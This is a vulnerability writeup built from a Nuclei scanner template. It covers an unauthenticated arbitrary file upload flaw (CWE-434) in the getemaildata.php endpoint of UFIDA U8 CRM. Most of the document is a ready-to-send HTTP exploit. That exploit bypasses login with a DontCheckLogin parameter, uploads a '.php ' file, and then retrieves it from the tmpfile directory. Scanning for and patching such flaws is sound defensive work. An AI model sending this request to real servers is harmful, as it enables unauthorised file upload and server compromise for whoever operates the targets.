# Nuclei Template: UFIDA U8-CRM getemaildata - Arbitary File Upload
**Template ID:** yonyou-u8-crm-fileupload
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** Critical
**CWE:** CWE-434
**Source:** Nuclei Template (`yonyou-u8-crm-fileupload.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file upload vulnerability in the getemaildata.php file of UFIDA U8 CRM customer relationship management system. An attacker can obtain server permissions through the vulnerability and attack the server.

## Steps to reproduce / Exploit Payload
```http
POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
Host: {{Hostname}}
Content-Length: 300
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAVuAKsvesmnWtgEP
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=ibru7pqnplhi720caq0ev8uvt0

------WebKitFormBoundaryAVuAKsvesmnWtgEP
Content-Disposition: form-data; name="file"; filename="%s.php "
Content-Type: application/octet-stream

{{randstr}}
------WebKitFormBoundaryAVuAKsvesmnWtgEP
Content-Disposition: form-data; name="upload"

upload
------WebKitFormBoundaryAVuAKsvesmnWtgEP--

GET /tmpfile/{{path}}.tmp.mht HTTP/1.1
Host: {{Hostname}}
```

